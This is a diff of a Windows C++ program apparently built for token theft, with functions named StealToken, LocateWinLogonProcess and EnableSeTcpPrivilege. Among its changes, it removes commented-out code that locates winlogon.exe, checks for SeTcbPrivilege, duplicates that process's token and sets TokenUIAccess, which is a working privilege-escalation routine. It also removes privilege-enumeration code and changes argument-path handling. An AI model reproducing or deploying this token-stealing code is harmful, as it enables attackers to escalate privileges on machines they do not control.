@@ -140,75 +140,6 @@ void GetTokenInfo(HANDLE TokenHandle)
     OutputDebugString(szOutput);
 }
 
-//void GetTokenInfo(HANDLE TokenHandle)
-//{
-//    LPVOID TokenInformation = NULL;
-//    DWORD TokenInformationLength = 0;
-//    DWORD ReturnLength;
-//    SID_NAME_USE SidType;
-//
-//    // Get the user information
-//    GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &ReturnLength);
-//    PTOKEN_USER pTokenUser = (PTOKEN_USER)GlobalAlloc(GPTR, ReturnLength);
-//    GetTokenInformation(TokenHandle, TokenUser, pTokenUser, ReturnLength, &ReturnLength);
-//
-//    // Convert SID to string
-//    wchar_t* userSid = NULL;
-//    ConvertSidToStringSidW(pTokenUser->User.Sid, &userSid);
-//    std::string sid = wcharToString(userSid);
-//
-//    TCHAR szGroupName[256];
-//    TCHAR szDomainName[256];
-//
-//    DWORD cchGroupName = 256;
-//    DWORD cchDomainName = 256;
-//
-//    // Lookup account SID
-//    LookupAccountSid(NULL, pTokenUser->User.Sid, szGroupName, &cchGroupName, szDomainName, &cchDomainName, &SidType);
-//
-//    // Output user information
-//    TCHAR szOutput[1000];
-//    _stprintf_s(szOutput, sizeof(szOutput) / sizeof(TCHAR), _T("[+] Current SID: %s\\%s @ %s\n"), szDomainName, szGroupName, sid.c_str());
-//    OutputDebugString(szOutput);
-//
-//    // Retrieve privileges
-//    GetTokenInformation(TokenHandle, TokenPrivileges, NULL, 0, &ReturnLength);
-//    PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)GlobalAlloc(GPTR, ReturnLength);
-//    if (GetTokenInformation(TokenHandle, TokenPrivileges, pTokenPrivileges, ReturnLength, &ReturnLength))
-//    {
-//        for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
-//        {
-//            LUID PrivilegeLuid = pTokenPrivileges->Privileges[i].Luid;
-//            TCHAR szPrivilegeName[256];
-//            DWORD cchPrivilegeName = 256;
-//
-//            // Lookup privilege name
-//            if (LookupPrivilegeName(NULL, &PrivilegeLuid, szPrivilegeName, &cchPrivilegeName))
-//            {
-//                // Determine if privilege is enabled
-//                TCHAR szStatus[10];
-//                if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
-//                {
-//                    _tcscpy_s(szStatus, _T("Enabled"));
-//                }
-//                else
-//                {
-//                    _tcscpy_s(szStatus, _T("Disabled"));
-//                }
-//
-//                // Output privilege information
-//                _stprintf_s(szOutput, sizeof(szOutput) / sizeof(TCHAR), _T("[+] Privilege: %s - %s\n"), szPrivilegeName, szStatus);
-//                OutputDebugString(szOutput);
-//            }
-//        }
-//    }
-//
-//    // Cleanup
-//    GlobalFree(pTokenUser);
-//    GlobalFree(pTokenPrivileges);
-//    LocalFree(userSid);
-//}
-
 int LocateWinLogonProcess()
 {
 
@@ -239,105 +170,6 @@ int LocateWinLogonProcess()
         CloseHandle(hSnapshot);
     }
 }
-
-
-//DWORD GetTokenWithPrivilege(HANDLE* outToken) {         // this is reserved code/
-//    HANDLE hCurrentProcess = GetCurrentProcess();
-//    HANDLE o_Token = nullptr;
-//    //LPVOID tokenSessionId = nullptr, winlogonTokenSessionId = nullptr;
-//    DWORD o_SessionId = 0;
-//    DWORD winlogon_SessionId = 0;
-//    DWORD dwSize = sizeof(o_SessionId);
-//    PRIVILEGE_SET requiredPrivileges = { 0 };
-//    HANDLE winlogonToken;
-//    HANDLE newToken = nullptr;
-//    HANDLE hSnapshot = nullptr;
-//    DWORD dwWinLogonPID = 0;
-//    BOOL hasPrivileges = FALSE;
-//    DWORD error = ERROR_SUCCESS;
-//
-//    if (!OpenProcessToken(hCurrentProcess, 0xAu, &o_Token)) {
-//        return GetLastError();
-//    }
-//
-//    if (!GetTokenInformation(o_Token, TokenSessionId, &o_SessionId, dwSize, &dwSize)) {
-//        CloseHandle(o_Token);
-//        return GetLastError();
-//    }
-//
-//    requiredPrivileges.PrivilegeCount = 1;
-//    requiredPrivileges.Control = PRIVILEGE_SET_ALL_NECESSARY;
-//
-//    if (!LookupPrivilegeValueA(0, "SeTcbPrivilege", &requiredPrivileges.Privilege[0].Luid)) {
-//        CloseHandle(o_Token);
-//        return GetLastError();
-//    }
-//
-//    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-//    if (hSnapshot == INVALID_HANDLE_VALUE) {
-//        CloseHandle(o_Token);
-//        return GetLastError();
-//    }
-//
-//    PROCESSENTRY32 processEntry;
-//    processEntry.dwSize = sizeof(PROCESSENTRY32);
-//    error = 1168;
-//
-//    if (Process32First(hSnapshot, &processEntry)) {
-//        do {
-//            if (strcmp(processEntry.szExeFile, "winlogon.exe") == 0) {
-//                dwWinLogonPID = processEntry.th32ProcessID;
-//                break;
-//            }
-//        } while (Process32Next(hSnapshot, &processEntry));
-//    }
-//    CloseHandle(hSnapshot);
-//
-//    if (dwWinLogonPID != 0) {
-//        HANDLE hWinLogonProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwWinLogonPID);
-//        if (hWinLogonProcess) {
-//            if (OpenProcessToken(hWinLogonProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &winlogonToken)) {
-//                if (PrivilegeCheck(winlogonToken, &requiredPrivileges, &hasPrivileges) && hasPrivileges && GetTokenInformation(winlogonToken, TokenSessionId, &winlogon_SessionId, dwSize, &dwSize) && winlogon_SessionId == o_SessionId) {
-//                    if (DuplicateTokenEx(winlogonToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &newToken)) {
-//                        error = 0;
-//                    }
-//                    else
-//                        error = GetLastError();
-//                }
-//                CloseHandle(winlogonToken);
-//            }
-//            CloseHandle(hWinLogonProcess);
-//        }
-//        else {
-//            //CloseHandle(hWinLogonProcess);
-//        }
-//    }
-//    
-//    if (SetThreadToken(0, newToken)) {
-//        if (DuplicateTokenEx(newToken, 0x8bu, 0, SecurityAnonymous, TokenPrimary, outToken)) {
-//            DWORD v24 = 1;
-//            if (!SetTokenInformation(*outToken, TokenUIAccess, &v24, 4u)) {
-//                CloseHandle(*outToken);
-//                RevertToSelf();
-//                CloseHandle(newToken);
-//                CloseHandle(o_Token);
-//                return GetLastError();
-//            }
-//        }
-//        else {
-//            error = GetLastError();
-//        }
-//        RevertToSelf();
-//        CloseHandle(newToken);
-//        CloseHandle(o_Token);
-//        return error;
-//    }
-//    else {
-//        CloseHandle(newToken);
-//        CloseHandle(o_Token);
-//        return GetLastError();
-//    }
-//}
 
 void EnableSeTcpPrivilege()
 {
@@ -439,21 +271,37 @@ BOOL StealToken(int TargetPID, HANDLE *outHandle)
     return result;
 }
 
-void GetExecutableDirectory(char* outPath, size_t size) {
-    char exePath[MAX_PATH];
-    if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
-        // Strip the executable name to get the directory
-        char* lastSlash = strrchr(exePath, '\\');
-        if (lastSlash) {
-            *lastSlash = '\0'; // Null-terminate at the last slash
-            strncpy_s(outPath, size, exePath, _TRUNCATE);
-        }
-    }
-    else {
-        // OutputDebugStringA("Failed to get executable path.");
-        outPath[0] = '\0';
-    }
-}
+//void GetExecutableDirectory(char* outPath, size_t size) {
+//    char exePath[MAX_PATH];
+//    if (GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
+//        // Strip the executable name to get the directory
+//        char* lastSlash = strrchr(exePath, '\\');
+//        if (lastSlash) {
+//            *lastSlash = '\0'; // Null-terminate at the last slash
+//            strncpy_s(outPath, size, exePath, _TRUNCATE);
+//        }
+//    }
+//    else {
+//        // OutputDebugStringA("Failed to get executable path.");
+//        outPath[0] = '\0';
+//    }
+//}
+//
+//bool IsAbsolutePath(const char* path) {
+//    // Check if the path starts with a drive letter (e.g., C:\)
+//    if ((strlen(path) > 2) && (path[1] == ':') &&
+//        ((path[2] == '\\') || (path[2] == '/'))) {
+//        return true;
+//    }
+//
+//    // Check if the path starts with a UNC path (e.g., \\server\share)
+//    if ((strlen(path) > 1) && (path[0] == '\\') && (path[1] == '\\')) {
+//        return true;
+//    }
+//
+//    // Otherwise, it's a relative path
+//    return false;
+//}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
@@ -491,13 +339,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         else // __argc >= 2
         {
-            char exeDir[MAX_PATH];
+            /*char exeDir[MAX_PATH];
             char fullPath[MAX_PATH];
             // Get the executable directory
-            GetExecutableDirectory(exeDir, MAX_PATH);
-            snprintf(fullPath, MAX_PATH, "%s\\%s", exeDir, __argv[1]);
+            if (IsAbsolutePath(__argv[1]))
+                strncpy_s(fullPath, sizeof(fullPath), __argv[1], _TRUNCATE);
+            else {
+                GetExecutableDirectory(exeDir, MAX_PATH);
+                snprintf(fullPath, MAX_PATH, "%s\\%s", exeDir, __argv[1]);
+            }*/
 
-            FILE* f = fopen(fullPath, "rb");
+            OutputDebugStringA(__argv[1]);
+
+            FILE* f = fopen(__argv[1], "rb");
             if (!f)
             {
                 text = _wcsdup(L"ERROR: Can't open file");
